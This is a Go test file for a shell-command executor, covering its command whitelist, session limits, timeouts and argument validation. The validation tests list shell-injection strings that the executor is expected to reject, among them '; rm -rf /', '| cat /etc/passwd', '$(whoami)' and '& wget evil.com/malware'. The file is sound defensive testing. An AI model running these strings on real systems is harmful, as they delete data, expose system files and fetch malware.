package shell

import (
	"context"
	"runtime"
	"strings"
	"testing"
	"time"
)

func TestNewExecutor(t *testing.T) {
	tests := []struct {
		name   string
		config Config
	}{
		{
			name: "disabled",
			config: Config{
				Enabled: false,
			},
		},
		{
			name: "enabled with whitelist",
			config: Config{
				Enabled:     true,
				Whitelist:   []string{"bash", "sh"},
				MaxSessions: 10,
			},
		},
		{
			name: "enabled with wildcard",
			config: Config{
				Enabled:     true,
				Whitelist:   []string{"*"},
				MaxSessions: 10,
			},
		},
		{
			name: "with timeout",
			config: Config{
				Enabled:     true,
				Whitelist:   []string{"*"},
				MaxSessions: 5,
				Timeout:     60 * time.Second,
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := NewExecutor(tt.config)
			if exec == nil {
				t.Fatal("NewExecutor() returned nil")
			}

			if exec.config.Enabled != tt.config.Enabled {
				t.Errorf("config.Enabled = %v, want %v", exec.config.Enabled, tt.config.Enabled)
			}
		})
	}
}

func TestExecutor_IsCommandAllowed(t *testing.T) {
	tests := []struct {
		name      string
		whitelist []string
		command   string
		want      bool
	}{
		{
			name:      "empty whitelist - nothing allowed",
			whitelist: []string{},
			command:   "ls",
			want:      false,
		},
		{
			name:      "wildcard allows all",
			whitelist: []string{"*"},
			command:   "anything",
			want:      true,
		},
		{
			name:      "exact match",
			whitelist: []string{"ls", "cat", "echo"},
			command:   "cat",
			want:      true,
		},
		{
			name:      "not in whitelist",
			whitelist: []string{"ls", "cat"},
			command:   "rm",
			want:      false,
		},
		{
			name:      "path not allowed",
			whitelist: []string{"bash"},
			command:   "/bin/bash",
			want:      false,
		},
		{
			name:      "vim allowed",
			whitelist: []string{"vim", "bash"},
			command:   "vim",
			want:      true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := NewExecutor(Config{
				Enabled:   true,
				Whitelist: tt.whitelist,
			})

			got := exec.IsCommandAllowed(tt.command)
			if got != tt.want {
				t.Errorf("IsCommandAllowed(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestExecutor_ValidateArgs(t *testing.T) {
	tests := []struct {
		name      string
		whitelist []string
		args      []string
		wantErr   bool
	}{
		{
			name:      "empty args",
			whitelist: []string{"echo"},
			args:      []string{},
			wantErr:   false,
		},
		{
			name:      "wildcard mode - skip validation",
			whitelist: []string{"*"},
			args:      []string{"; rm -rf /"},
			wantErr:   false, // Wildcard mode skips validation
		},
		{
			name:      "shell injection - semicolon",
			whitelist: []string{"echo"},
			args:      []string{"; rm -rf /"},
			wantErr:   true,
		},
		{
			name:      "shell injection - pipe",
			whitelist: []string{"echo"},
			args:      []string{"| cat /etc/passwd"},
			wantErr:   true,
		},
		{
			name:      "shell injection - ampersand",
			whitelist: []string{"echo"},
			args:      []string{"& wget evil.com/malware"},
			wantErr:   true,
		},
		{
			name:      "shell injection - backtick",
			whitelist: []string{"echo"},
			args:      []string{"`id`"},
			wantErr:   true,
		},
		{
			name:      "shell injection - dollar parentheses",
			whitelist: []string{"echo"},
			args:      []string{"$(whoami)"},
			wantErr:   true,
		},
		{
			name:      "absolute path not allowed",
			whitelist: []string{"cat"},
			args:      []string{"/etc/passwd"},
			wantErr:   true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := NewExecutor(Config{
				Enabled:   true,
				Whitelist: tt.whitelist,
			})
			err := exec.ValidateArgs(tt.args)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateArgs(%v) error = %v, wantErr %v", tt.args, err, tt.wantErr)
			}
		})
	}
}

func TestExecutor_AcquireReleaseSession(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 2,
	})

	// Acquire first session
	if err := exec.AcquireSession(); err != nil {
		t.Errorf("AcquireSession() error = %v for first session", err)
	}

	// Acquire second session
	if err := exec.AcquireSession(); err != nil {
		t.Errorf("AcquireSession() error = %v for second session", err)
	}

	// Third should fail (max 2)
	if err := exec.AcquireSession(); err == nil {
		t.Error("AcquireSession() should have failed for third session")
	}

	// Release one
	exec.ReleaseSession()

	// Now should succeed
	if err := exec.AcquireSession(); err != nil {
		t.Errorf("AcquireSession() error = %v after release", err)
	}

	// Check active count
	if exec.ActiveSessions() != 2 {
		t.Errorf("ActiveSessions() = %d, want 2", exec.ActiveSessions())
	}
}

func TestExecutor_NewSession(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping session test on Windows")
	}

	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"*"},
		Timeout:     10 * time.Second,
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "echo",
		Args:    []string{"hello"},
	}

	session, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session.Close()
		exec.ReleaseSession()
	}()

	// Start the session
	if err := session.Start(); err != nil {
		t.Fatalf("session.Start() error = %v", err)
	}

	// Wait for completion
	select {
	case <-session.Done():
	case <-time.After(5 * time.Second):
		t.Fatal("session did not complete in time")
	}

	// Check exit code
	if session.ExitCode() != 0 {
		t.Errorf("ExitCode() = %d, want 0", session.ExitCode())
	}
}

func TestExecutor_NewSession_NotWhitelisted(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"ls", "cat"}, // echo not allowed
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "echo",
		Args:    []string{"hello"},
	}

	_, err := exec.NewSession(ctx, meta)
	if err == nil {
		t.Error("NewSession() expected error for non-whitelisted command")
	}

	if !strings.Contains(err.Error(), "not allowed") {
		t.Errorf("NewSession() error = %q, want error containing 'not allowed'", err.Error())
	}
}

func TestExecutor_NewSession_SessionLimit(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 1,
		Whitelist:   []string{"*"},
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "sleep",
		Args:    []string{"10"},
	}

	// First session
	session1, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session1.Close()
		exec.ReleaseSession()
	}()

	// Second should fail (max 1)
	_, err = exec.NewSession(ctx, meta)
	if err == nil {
		t.Error("NewSession() expected error for session limit")
	}

	if !strings.Contains(err.Error(), "max sessions") {
		t.Errorf("NewSession() error = %q, want error containing 'max sessions'", err.Error())
	}
}

func TestDefaultConfig(t *testing.T) {
	cfg := DefaultConfig()

	if cfg.Enabled {
		t.Error("DefaultConfig().Enabled = true, want false")
	}

	if len(cfg.Whitelist) != 0 {
		t.Errorf("DefaultConfig().Whitelist = %v, want empty", cfg.Whitelist)
	}

	if cfg.MaxSessions != 0 {
		t.Errorf("DefaultConfig().MaxSessions = %d, want 0 (unlimited)", cfg.MaxSessions)
	}

	if cfg.Timeout != 0 {
		t.Errorf("DefaultConfig().Timeout = %v, want 0", cfg.Timeout)
	}
}

func TestExecutor_AcquireSession_Unlimited(t *testing.T) {
	// MaxSessions = 0 means unlimited
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 0,
	})

	// Should be able to acquire many sessions without limit
	for i := 0; i < 100; i++ {
		if err := exec.AcquireSession(); err != nil {
			t.Errorf("AcquireSession() error = %v at session %d, want nil (unlimited)", err, i+1)
		}
	}

	if exec.ActiveSessions() != 100 {
		t.Errorf("ActiveSessions() = %d, want 100", exec.ActiveSessions())
	}

	// Release all
	for i := 0; i < 100; i++ {
		exec.ReleaseSession()
	}

	if exec.ActiveSessions() != 0 {
		t.Errorf("ActiveSessions() = %d after release, want 0", exec.ActiveSessions())
	}
}

func TestExecutor_AcquireSession_Limited(t *testing.T) {
	// MaxSessions > 0 enforces limit
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 3,
	})

	// Acquire up to limit
	for i := 0; i < 3; i++ {
		if err := exec.AcquireSession(); err != nil {
			t.Errorf("AcquireSession() error = %v at session %d", err, i+1)
		}
	}

	// Fourth should fail
	if err := exec.AcquireSession(); err == nil {
		t.Error("AcquireSession() should fail when limit reached")
	} else if !strings.Contains(err.Error(), "max sessions") {
		t.Errorf("AcquireSession() error = %q, want error containing 'max sessions'", err.Error())
	}

	// Release one and try again
	exec.ReleaseSession()
	if err := exec.AcquireSession(); err != nil {
		t.Errorf("AcquireSession() error = %v after release", err)
	}
}

func TestExecutor_hasWildcard(t *testing.T) {
	tests := []struct {
		name      string
		whitelist []string
		want      bool
	}{
		{
			name:      "empty whitelist",
			whitelist: []string{},
			want:      false,
		},
		{
			name:      "only wildcard",
			whitelist: []string{"*"},
			want:      true,
		},
		{
			name:      "wildcard among others",
			whitelist: []string{"ls", "*", "cat"},
			want:      true,
		},
		{
			name:      "no wildcard",
			whitelist: []string{"ls", "cat", "echo"},
			want:      false,
		},
		{
			name:      "wildcard-like but not wildcard",
			whitelist: []string{"**", "ls*", "*cat"},
			want:      false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := NewExecutor(Config{
				Enabled:   true,
				Whitelist: tt.whitelist,
			})

			got := exec.hasWildcard()
			if got != tt.want {
				t.Errorf("hasWildcard() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestExecutor_validateAndAcquire_Disabled(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     false,
		Whitelist:   []string{"*"},
		MaxSessions: 10,
	})

	meta := &ShellMeta{
		Command: "echo",
		Args:    []string{"hello"},
	}

	err := exec.validateAndAcquire(meta)
	if err == nil {
		t.Error("validateAndAcquire() expected error when shell disabled")
	}
	if !strings.Contains(err.Error(), "disabled") {
		t.Errorf("validateAndAcquire() error = %q, want error containing 'disabled'", err.Error())
	}
}

func TestExecutor_validateAndAcquire_CommandNotAllowed(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		Whitelist:   []string{"ls", "cat"},
		MaxSessions: 10,
	})

	meta := &ShellMeta{
		Command: "rm",
		Args:    []string{"-rf", "/"},
	}

	err := exec.validateAndAcquire(meta)
	if err == nil {
		t.Error("validateAndAcquire() expected error for non-whitelisted command")
	}
	if !strings.Contains(err.Error(), "not allowed") {
		t.Errorf("validateAndAcquire() error = %q, want error containing 'not allowed'", err.Error())
	}
}

func TestExecutor_validateAndAcquire_DangerousArgs(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		Whitelist:   []string{"echo"},
		MaxSessions: 10,
	})

	meta := &ShellMeta{
		Command: "echo",
		Args:    []string{"$(whoami)"},
	}

	err := exec.validateAndAcquire(meta)
	if err == nil {
		t.Error("validateAndAcquire() expected error for dangerous args")
	}
	if !strings.Contains(err.Error(), "dangerous") {
		t.Errorf("validateAndAcquire() error = %q, want error containing 'dangerous'", err.Error())
	}
}

func TestExecutor_validateAndAcquire_MaxSessions(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		Whitelist:   []string{"*"},
		MaxSessions: 1,
	})

	// Acquire first session
	exec.AcquireSession()

	meta := &ShellMeta{
		Command: "echo",
		Args:    []string{"hello"},
	}

	err := exec.validateAndAcquire(meta)
	if err == nil {
		t.Error("validateAndAcquire() expected error when max sessions reached")
	}
	if !strings.Contains(err.Error(), "max sessions") {
		t.Errorf("validateAndAcquire() error = %q, want error containing 'max sessions'", err.Error())
	}
}

func TestExecutor_validateAndAcquire_Success(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		Whitelist:   []string{"*"},
		MaxSessions: 10,
	})

	meta := &ShellMeta{
		Command: "echo",
		Args:    []string{"hello"},
	}

	err := exec.validateAndAcquire(meta)
	if err != nil {
		t.Errorf("validateAndAcquire() unexpected error = %v", err)
	}

	// Should have acquired a session
	if exec.ActiveSessions() != 1 {
		t.Errorf("ActiveSessions() = %d, want 1", exec.ActiveSessions())
	}

	// Clean up
	exec.ReleaseSession()
}

func TestExecutor_ReleaseSession_NoUnderflow(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
	})

	// Release when sessions = 0 should not underflow
	exec.ReleaseSession()
	exec.ReleaseSession()
	exec.ReleaseSession()

	if exec.ActiveSessions() != 0 {
		t.Errorf("ActiveSessions() = %d, want 0 (no underflow)", exec.ActiveSessions())
	}

	// Acquire should still work
	if err := exec.AcquireSession(); err != nil {
		t.Errorf("AcquireSession() after releases should work, got error = %v", err)
	}

	if exec.ActiveSessions() != 1 {
		t.Errorf("ActiveSessions() = %d, want 1", exec.ActiveSessions())
	}
}

func TestExecutor_ValidateArgs_MoreDangerousPatterns(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:   true,
		Whitelist: []string{"echo"},
	})

	tests := []struct {
		name    string
		args    []string
		wantErr bool
	}{
		{
			name:    "safe args",
			args:    []string{"hello", "world"},
			wantErr: false,
		},
		{
			name:    "relative path ok",
			args:    []string{"./file.txt"},
			wantErr: false,
		},
		{
			name:    "bracket expansion",
			args:    []string{"{a,b,c}"},
			wantErr: true,
		},
		{
			name:    "square bracket glob",
			args:    []string{"file[0-9].txt"},
			wantErr: true,
		},
		{
			name:    "redirect output",
			args:    []string{"> output.txt"},
			wantErr: true,
		},
		{
			name:    "redirect input",
			args:    []string{"< input.txt"},
			wantErr: true,
		},
		{
			name:    "exclamation mark",
			args:    []string{"!important"},
			wantErr: true,
		},
		{
			name:    "asterisk glob",
			args:    []string{"*.txt"},
			wantErr: true,
		},
		{
			name:    "question mark glob",
			args:    []string{"file?.txt"},
			wantErr: true,
		},
		{
			name:    "tilde expansion",
			args:    []string{"~/Documents"},
			wantErr: true,
		},
		{
			name:    "backslash escape",
			args:    []string{"file\\ name.txt"},
			wantErr: true,
		},
		{
			name:    "dollar variable",
			args:    []string{"$HOME"},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := exec.ValidateArgs(tt.args)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateArgs(%v) error = %v, wantErr %v", tt.args, err, tt.wantErr)
			}
		})
	}
}

func TestSession_Methods(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping session methods test on Windows")
	}

	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"*"},
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "cat",
		Env:     map[string]string{"TEST_VAR": "test_value"},
		WorkDir: "/tmp",
	}

	session, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session.Close()
		exec.ReleaseSession()
	}()

	// Test Stdin(), Stdout(), Stderr() return non-nil
	if session.Stdin() == nil {
		t.Error("Stdin() should not be nil")
	}
	if session.Stdout() == nil {
		t.Error("Stdout() should not be nil")
	}
	if session.Stderr() == nil {
		t.Error("Stderr() should not be nil")
	}

	// Test Context() returns non-nil
	if session.Context() == nil {
		t.Error("Context() should not be nil")
	}

	// Test Duration() before start
	dur := session.Duration()
	if dur < 0 {
		t.Errorf("Duration() should be >= 0, got %v", dur)
	}

	// Test ExitCode() before completion (should be -1)
	if session.ExitCode() != -1 {
		t.Errorf("ExitCode() before completion = %d, want -1", session.ExitCode())
	}

	// Test Error() before completion (should be nil)
	if session.Error() != nil {
		t.Errorf("Error() before completion = %v, want nil", session.Error())
	}
}

func TestSession_StartTwice(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping session start twice test on Windows")
	}

	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"*"},
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "echo",
		Args:    []string{"hello"},
	}

	session, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session.Close()
		exec.ReleaseSession()
	}()

	// First start should succeed
	if err := session.Start(); err != nil {
		t.Fatalf("First Start() error = %v", err)
	}

	// Second start should fail
	err = session.Start()
	if err == nil {
		t.Error("Second Start() should return error")
	}
	if !strings.Contains(err.Error(), "already started") {
		t.Errorf("Second Start() error = %q, want error containing 'already started'", err.Error())
	}
}

func TestSession_SignalNotStarted(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping signal test on Windows")
	}

	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"*"},
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "sleep",
		Args:    []string{"10"},
	}

	session, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session.Close()
		exec.ReleaseSession()
	}()

	// Signal before start should fail
	err = session.Signal(15) // SIGTERM
	if err == nil {
		t.Error("Signal() before Start() should return error")
	}
	if !strings.Contains(err.Error(), "not started") {
		t.Errorf("Signal() error = %q, want error containing 'not started'", err.Error())
	}
}

func TestSession_WithEnvironmentAndWorkDir(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping env/workdir test on Windows")
	}

	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"*"},
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "pwd",
		WorkDir: "/tmp",
		Env:     map[string]string{"MY_VAR": "my_value"},
	}

	session, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session.Close()
		exec.ReleaseSession()
	}()

	if err := session.Start(); err != nil {
		t.Fatalf("Start() error = %v", err)
	}

	// Wait for completion
	select {
	case <-session.Done():
	case <-time.After(5 * time.Second):
		t.Fatal("session did not complete in time")
	}

	if session.ExitCode() != 0 {
		t.Errorf("ExitCode() = %d, want 0", session.ExitCode())
	}
}

func TestExecutor_NewSession_PerRequestTimeout(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping per-request timeout test on Windows")
	}

	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"*"},
		Timeout:     10 * time.Second, // Config timeout
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "sleep",
		Args:    []string{"0.1"},
		Timeout: 2, // Per-request timeout (takes precedence)
	}

	session, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session.Close()
		exec.ReleaseSession()
	}()

	if err := session.Start(); err != nil {
		t.Fatalf("Start() error = %v", err)
	}

	// Wait for completion
	select {
	case <-session.Done():
	case <-time.After(5 * time.Second):
		t.Fatal("session did not complete in time")
	}

	if session.ExitCode() != 0 {
		t.Errorf("ExitCode() = %d, want 0", session.ExitCode())
	}
}

func TestExecutor_NewSession_NoTimeout(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping no timeout test on Windows")
	}

	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"*"},
		Timeout:     0, // No config timeout
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "echo",
		Args:    []string{"quick"},
		Timeout: 0, // No per-request timeout
	}

	session, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session.Close()
		exec.ReleaseSession()
	}()

	if err := session.Start(); err != nil {
		t.Fatalf("Start() error = %v", err)
	}

	// Wait for completion
	select {
	case <-session.Done():
	case <-time.After(5 * time.Second):
		t.Fatal("session did not complete in time")
	}

	if session.ExitCode() != 0 {
		t.Errorf("ExitCode() = %d, want 0", session.ExitCode())
	}
}

func TestExecutor_IsCommandAllowed_WindowsPath(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:   true,
		Whitelist: []string{"cmd"},
	})

	// Windows-style path should not be allowed
	if exec.IsCommandAllowed("C:\\Windows\\cmd.exe") {
		t.Error("IsCommandAllowed() should reject Windows-style paths")
	}
}

func TestExecutor_ValidateArgs_ArgumentIndex(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:   true,
		Whitelist: []string{"echo"},
	})

	// Third argument has dangerous pattern
	args := []string{"hello", "world", "; rm -rf /"}
	err := exec.ValidateArgs(args)
	if err == nil {
		t.Error("ValidateArgs() expected error for dangerous arg")
	}

	// Error should mention argument index 2
	if !strings.Contains(err.Error(), "argument 2") {
		t.Errorf("ValidateArgs() error = %q, want error mentioning 'argument 2'", err.Error())
	}
}

func TestSession_SignalAfterStart(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping signal test on Windows")
	}

	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"*"},
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "sleep",
		Args:    []string{"10"},
	}

	session, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session.Close()
		exec.ReleaseSession()
	}()

	// Start the session
	if err := session.Start(); err != nil {
		t.Fatalf("Start() error = %v", err)
	}

	// Give process time to start
	time.Sleep(100 * time.Millisecond)

	// Signal after start should succeed
	err = session.Signal(15) // SIGTERM
	if err != nil {
		t.Errorf("Signal() after Start() error = %v", err)
	}

	// Wait for process to exit
	select {
	case <-session.Done():
	case <-time.After(5 * time.Second):
		t.Fatal("session did not complete after signal")
	}

	// Process should have non-zero exit code (killed by signal)
	exitCode := session.ExitCode()
	if exitCode == 0 {
		t.Logf("Warning: exit code was 0 after SIGTERM, process may have exited normally")
	}
}

func TestSession_ErrorAfterNonZeroExit(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping exit code test on Windows")
	}

	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"*"},
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "false", // Always exits with code 1
	}

	session, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session.Close()
		exec.ReleaseSession()
	}()

	if err := session.Start(); err != nil {
		t.Fatalf("Start() error = %v", err)
	}

	// Wait for completion
	select {
	case <-session.Done():
	case <-time.After(5 * time.Second):
		t.Fatal("session did not complete")
	}

	// Check exit code
	if session.ExitCode() != 1 {
		t.Errorf("ExitCode() = %d, want 1", session.ExitCode())
	}

	// Error should be non-nil for non-zero exit
	if session.Error() == nil {
		t.Error("Error() should be non-nil for non-zero exit code")
	}
}

func TestSession_CloseBeforeStart(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"*"},
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "sleep",
		Args:    []string{"10"},
	}

	session, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}

	// Close before start should not panic
	session.Close()
	exec.ReleaseSession()
}
